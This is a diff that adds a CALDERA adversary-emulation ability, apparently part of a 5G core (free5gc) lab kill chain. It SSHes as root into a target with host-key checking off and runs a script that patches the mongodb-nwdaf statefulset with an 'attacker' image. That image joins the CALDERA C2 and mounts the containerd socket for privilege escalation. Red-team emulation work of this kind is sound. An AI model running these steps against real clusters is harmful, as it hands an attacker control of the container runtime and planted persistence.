@@ -1,0 +1,37 @@
+- id: 20000000-0000-0000-0000-000000000004
+  name: Patch mongodb-nwdaf into KC2 child agent
+  description: Patch mongodb-nwdaf so it restarts with the attacker image, joins CALDERA as child, and receives the containerd socket mount.
+  tactic: privilege-escalation
+  technique: { attack_id: T1609, name: "Container Administration Command" }
+  repeatable: false
+  singleton: true
+  platforms:
+    linux:
+      sh:
+        command: >-
+          ENTRY='#{host.kc2.entry}';
+          PREV='#{kc2.23.done}';
+          mkdir -p "$DATA_PATH/KC2";
+          KC2_CHILD_IMAGE="${KC2_CHILD_IMAGE:-${REGISTRY_NAME:-registry}:${REGISTRY_PORT:-5000}/attacker:${IMAGE_VERSION:-2.0.2}}";
+          TARGET="$(cat "$DATA_PATH/KC2/attackaddr")";
+          ssh -p 4222 -o StrictHostKeyChecking=no root@"$TARGET"
+          "KC2_TARGET_NAMESPACE='${KC2_TARGET_NAMESPACE:-free5gc}'
+          KC2_TARGET_STATEFULSET='${KC2_TARGET_STATEFULSET:-mongodb-nwdaf}'
+          KC2_CHILD_GROUP='${KC2_CHILD_GROUP:-outside}'
+          KC2_CHILD_ROLE='${KC2_CHILD_ROLE:-child}'
+          KC2_CHILD_IMAGE='$KC2_CHILD_IMAGE'
+          KC2_CONTAINERD_SOCKET='${KC2_CONTAINERD_SOCKET:-/run/containerd/containerd.sock}'
+          CALDERA_URL='${CALDERA_URL:-http://caldera:8888}'
+          REGISTRY_NAME='${REGISTRY_NAME:-registry}'
+          REGISTRY_PORT='${REGISTRY_PORT:-5000}'
+          IMAGE_VERSION='${IMAGE_VERSION:-2.0.2}'
+          /usr/bin/env python3 -" < /opt/caldera/KC4/patch-mongodb-nwdaf.py;
+          echo kc2-24-done
+        timeout: 900
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+            - source: kc2.24.done
+        cleanup: ""
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+      - source: host.kc2.entry
